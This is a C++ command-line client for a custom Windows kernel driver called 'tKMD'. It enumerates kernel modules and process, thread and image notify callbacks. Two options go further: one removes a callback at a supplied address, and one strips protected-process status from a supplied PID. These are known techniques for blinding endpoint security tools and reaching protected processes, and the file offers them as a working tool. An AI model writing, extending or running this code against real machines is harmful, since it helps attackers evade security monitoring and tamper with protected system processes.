#include <stdio.h>
#include <stdlib.h>
#include "userland.hpp"
#include "../tKMD/ioctl.h"

void PrintCallbackInfo(CALLBACK_INFO callbacks[]);
OFFSET ValidateSupportedVersion(HANDLE hDriver);

int main(int argc, char * argv[])
{
	HANDLE hDriver;
	BOOL success; 
	OFFSET offset;

	hDriver = CreateFile(L"\\\\.\\tKMD", GENERIC_WRITE, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);

	if (hDriver == INVALID_HANDLE_VALUE)
	{
		printf("[-] failed to open a handle to the driver: %d\n", GetLastError());
		return 1;
	}

	WINDOWS_VERSION version;
	if (success = DeviceIoControl(hDriver, IOCTL_WINDOWS_VERSION, nullptr, 0, &version, sizeof(version), nullptr, nullptr))
	{
		printf("Current Windows Version: %lu.%lu.%lu\n", version.MajorVersion, version.MinorVersion, version.BuildNumber);
	}

	if (argc < 2)
	{
		printf("Usage: .exe <int:toggle>\n\t"
			"1: (RING 0) LIST KERNEL MODULES\n\t" 
			"2: (RING 0) LIST PROCESSNOTIFY CALLBACKS\n\t"
			"3: (RING 0) LIST THREADNOTIFY CALLBACKS\n\t"
			"4: (RING 0) LIST IMAGENOTIFY CALLBACKS\n\t"
			"5: (RING 0) DISABLE CALLBACK <PVOID:address>\n\t"
			"6: (RING 0) REMOVE_PS_PROTECTION FROM <int:PID>\n\t"
			"7: (RING 3) LIST KERNEL OBJECTS OF <int:PID>\n\t"
			"8: (RING 3) LIST KERNEL MODULES\n\t"
		);
		return 1;
	}

	int toggle = atoi(argv[1]);

	switch (toggle)
	{
		case 1: //LIST KERNEL MODULES
		{
			MODULE_NAMES modules[256];
			int cDrivers = 0;
			RtlZeroMemory(modules, sizeof(modules));
		
			if (success = DeviceIoControl(hDriver, IOCTL_LIST_MODULES, nullptr, 0, &modules, sizeof(modules), nullptr, nullptr))
			{
				printf("[*] Listing all system modules...\n");
				for (auto i = 0; i < 256; i++)
				{
					if (strlen(modules[i].Name) > 0)
					{
						cDrivers++;
						printf("[%d] %s\n", i+1, modules[i].Name);
					}
				}
				printf("%d drivers detected\n", cDrivers);
			}
			break;
		}
		case 2: //LIST PROCESSNOTIFY CALLBACKS
		{
			offset = ValidateSupportedVersion(hDriver);
			if (offset.PROCESS_NOTIFY_OFFSET == 0x00)
			{
				printf("[-] Unfortunately, this Windows version is not supported for PROCESSNOTIFY CALLBACKS. Terminating...\n");
				exit(1);
			}

			CALLBACK_INFO callbacks[256];
			RtlZeroMemory(callbacks, sizeof(callbacks));

			printf("[*] Listing process notify callbacks...\n");
			if (success = DeviceIoControl(hDriver, IOCTL_CALLBACK_PROCESS, nullptr, 0, &callbacks, sizeof(callbacks), nullptr, nullptr)) PrintCallbackInfo(callbacks);
			break;
		}
		case 3: // LIST THREADNOTIFY CALLBACKS
		{
			offset = ValidateSupportedVersion(hDriver);
			if (offset.THREAD_NOTIFY_OFFSET == 0x00)
			{
				printf("[-] Unfortunately, this Windows version is not supported for THREADNOTIFY CALLBACKS. Terminating...\n");
				exit(1);
			}

			CALLBACK_INFO callbacks[256];
			RtlZeroMemory(callbacks, sizeof(callbacks));

			printf("[*] Listing thread notify callbacks...\n");
			if (success = DeviceIoControl(hDriver, IOCTL_CALLBACK_THREAD, nullptr, 0, &callbacks, sizeof(callbacks), nullptr, nullptr)) PrintCallbackInfo(callbacks);
			break;
		}
		case 4: //LIST IMAGENOTIFY CALLBACKS
		{
			offset = ValidateSupportedVersion(hDriver);
			if (offset.IMAGE_NOTIFY_OFFSET == 0x00)
			{
				printf("[-] Unfortunately, this Windows version is not supported for IMAGENOTIFY CALLBACKS. Terminating...\n");
				exit(1);
			}

			CALLBACK_INFO callbacks[256];
			RtlZeroMemory(callbacks, sizeof(callbacks));
		
			printf("[*] Listing image notify callbacks...\n");
			if (success = DeviceIoControl(hDriver, IOCTL_CALLBACK_IMAGE, nullptr, 0, &callbacks, sizeof(callbacks), nullptr, nullptr)) PrintCallbackInfo(callbacks);
			break;
		}
		case 5: //DISABLE CALLBACK
		{
			if (argc < 3)
			{
				printf("[-] Callback's address to be provided\n");
				exit(1);
			}

			unsigned long long address = strtoull(argv[2], NULL, 16);
		
			PTARGET_CALLBACK target = new TARGET_CALLBACK{ address };
			if (success = DeviceIoControl(hDriver, IOCTL_CALLBACK_REMOVE, target, sizeof(target), nullptr, 0, nullptr, nullptr))
			{
				printf("[*] Removed callback @ 0x%llx\n", address);
			}
			break;
		}
		case 6: //REMOVE PS_PROTECTION			
		{
			offset = ValidateSupportedVersion(hDriver);
			if (offset.PS_PROTECTION_OFFSET == 0x00)
			{
				printf("[-] Unfortunately, this Windows version is not supported for PS_PROTECTION. Terminating...\n");
				exit(1);
			}

			if (argc < 3)
			{
				printf("[-] PID to be provided\n");
				exit(1);
			}

			PTARGET_PROCESS target = new TARGET_PROCESS{ atoi(argv[2]) };

			if (success = DeviceIoControl(hDriver, IOCTL_REMOVE_PS_PROTECTION, target, sizeof(target), nullptr, 0, nullptr, nullptr))
			{
				printf("[*] Removed protection from %d\n", target->ProcessId);
			}
			else
			{
				printf("[-] error: 0x%d\n", GetLastError());
			}
			break;
		}
		case 7: //LIST KERNEL OBJECTS VIA PROCESS HANDLES
		{
			if (argc < 3)
			{
				printf("[-] PID to be provided\n");
				exit(1);
			}

			listAllKernelObjectsViaHandles(atoi(argv[2]));
			break;
		}
		case 8: //CHECK LOADED KERNEL MODULES FROM USERLAND
		{
			listAllKernelDrivers();
			break;
		}
	}
	CloseHandle(hDriver);
}

void PrintCallbackInfo(CALLBACK_INFO callbacks[])
{
	for (auto i = 0; i < 256; i++)
	{
		if (callbacks[i].Address == 0) continue;
		printf("\t[%d] 0x%llx -> %s\n", i, callbacks[i].Address, callbacks[i].Module);
	}
}

OFFSET ValidateSupportedVersion(HANDLE hDriver)
{
	OFFSET offset;
	if (!DeviceIoControl(hDriver, IOCTL_SUPPORTED_VERSION, nullptr, 0, &offset, sizeof(OFFSET), nullptr, nullptr))
	{
		printf("[-] IOCTL_SUPPORTED_VERSION: Could not be validated. Terminating...\n");
		exit(1);
	}
	return offset;
}